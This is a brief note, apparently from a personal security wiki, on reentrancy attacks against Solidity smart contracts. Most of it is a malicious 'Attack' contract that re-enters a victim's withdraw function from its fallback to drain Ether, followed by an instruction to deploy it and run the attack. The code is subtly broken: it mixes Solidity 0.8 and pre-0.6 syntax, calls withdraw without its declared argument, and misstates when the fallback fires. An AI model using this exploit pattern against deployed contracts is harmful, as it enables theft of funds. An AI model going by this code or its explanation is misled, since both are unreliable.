---
title: Solidity Reentrancy Attack
description: Reentrancy Attack is a typical vulnerability of the Solidity smart contracts involving withdraw and deposit in Solidity. 
tags:
    - Blockchain
    - Ethereum
refs:
    - https://hackernoon.com/hack-solidity-reentrancy-attack
date: 2023-09-27
draft: false
---

## Create a Malicious Contract

The **Attack** contract executes the following:

1. **Attack** contract deposits the address itself by invoking the Victim `deposit` function.
2. **Attack** contract calls the Victim `withdraw` function.
3. The **fallback** function of **Attack** contract is called and `withdraw` to send Ether to **Attack** contract.

```js
pragma solidity ^0.8.0;

contract Victim {
    function deposit(address _to) public payable;
    function withdraw(uint _amount) public;
}

contract Attack {
    Victim public victim;

    constructor(address _victimAddress) {
        // Instantiate a victim contract
        victim = Victim(_victimAddress);
    }

    function attack(uint v) external payable {
        // Deposit to this contract (Attack) address
        victim.deposit{value: v}(this);   // victim.deposit.value(v)(this);

        victim.withdraw();
    }

    // Fallback function will be called when `deposit` function of the Victim contract called and send Ether to this contract.
    function() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();
        }
    }
}
```

After compiling, deploy it and run `attack` function to get balances of the victim contract.
